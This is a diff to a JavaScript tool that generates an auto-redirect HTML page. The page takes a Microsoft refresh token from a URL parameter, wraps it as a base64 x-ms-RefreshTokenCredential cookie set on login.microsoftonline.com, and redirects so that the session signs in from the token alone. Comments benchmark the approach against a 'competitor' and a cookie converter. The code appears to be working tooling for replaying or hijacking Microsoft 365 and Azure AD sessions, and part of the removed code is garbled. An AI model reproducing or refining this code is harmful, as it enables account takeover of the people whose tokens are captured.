@@ -398,7 +398,6 @@ function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType)
 // =========================================================
 
 function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken, tenant, accountType, rtParam) {
-  const safeRefreshToken = refreshToken ? refreshToken.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '"') : '';
   const targetName = accountType === 'personal' ? 'Microsoft Personal Account' : 'Microsoft 365 / Azure AD';
 
   return `<!DOCTYPE html>
@@ -487,7 +486,6 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken
     <div class="spinner"></div>
     <div class="info-box">
       <p><strong>Status:</strong> Authenticating...</p>
-      <p><strong>Token:</strong> <code>${safeTokenPreview}</code></p>
       <p><strong>Target:</strong> ${targetName}</p>
       <p><strong>Method:</strong> ${tokenType}</p>
     </div>
@@ -500,35 +498,50 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken
     </a>
   </div>
   <script>
-    // The refresh token is passed via URL parameter to avoid JSON wrapper format
-    // Microsoft's x-ms-RefreshTokenCredential expects the RAW refresh token JWT
-    var rtParam = '${rtParam || ''}';
+    // x-ms-RefreshTokenCredential format: base64-encoded JSON
+    // Format: {"token_type":"Bearer","refresh_token":"<RAW_REFRESH_TOKEN>","expires_in":1209599}
+    // This matches how cookieconverter.js generates the credential cookie
     var statusDiv = document.getElementById('status');
     var manualBtn = document.getElementById('manualBtn');
 
-    if (rtParam) {
-      // Extract refresh token from URL parameter (format: ?rt=ENCODED_TOKEN)
-      var refreshToken = rtParam.substring(3); // Remove '?
-      
-rt=' prefix      try {
-        // Set the x-ms-RefreshTokenCredential cookie EXACTLY like competitor
-        // Competitor format: x-ms-RefreshTokenCredential=eyJhbGciOi... (raw JWT, not JSON)
-        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(refreshToken) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None';
+    
+    function getRefreshTokenFromUrl() {
+      var params = new URLSearchParams(window.location.search);
+      var rt = params.get('rt');
+      return rt || '';
+    }
+    
+    var rawRefreshToken = getRefreshTokenFromUrl();
+    
+    if (rawRefreshToken && rawRefreshToken.length > 10) {
+      try {
+        // Build the credential JSON object (same format as cookieconverter.js)
+        var credentialObj = {
+          token_type: 'Bearer',
+          refresh_token: rawRefreshToken,
+          expires_in: 1209599
+        };
+        // Base64 encode the JSON (same as cookieconverter.js line 98)
+        var credentialJson = JSON.stringify(credentialObj);
+        var base64Credential = btoa(credentialJson);
+        
+        // Set x-ms-RefreshTokenCredential cookie
+        // Note: Browser security may block cross-domain cookies, but we try anyway.
+        // Microsoft login services may read this on redirect.
+        document.cookie = 'x-ms-RefreshTokenCredential=' + base64Credential + '; path=/; domain=.login.microsoftonline.com; Secure; SameSite=None';
 
-        statusDiv.innerHTML = 'STEP 1: Credential cookie injected ✓<br>STEP 2: Authenticating with Microsoft...';
+        statusDiv.innerHTML = 'STEP 1: Credential cookie prepared ✓<br>STEP 2: Redirecting to Microsoft...';
 
-        // Redirect to Microsoft's auth endpoint
-        // Microsoft reads x-ms-RefreshTokenCredential cookie and auto-authenticates
-        // Then redirects to a long PostAuth URL and shows account as signed in
+        // Redirect to Microsoft login which will read the cookie
         setTimeout(function() {
           window.location.href = 'https://login.microsoftonline.com/?auth=2';
         }, 1500);
       } catch(e) {
-        statusDiv.innerHTML = 'Error: ' + e.message;
+        statusDiv.innerHTML = 'Error preparing credentials: ' + e.message + '<br>Click button to continue manually.';
         manualBtn.style.display = 'inline-block';
       }
     } else {
-      statusDiv.innerHTML = 'No refresh token available. Click button to continue.';
+      statusDiv.innerHTML = 'No refresh token found in request. Click button to continue.';
       manualBtn.style.display = 'inline-block';
     }
 
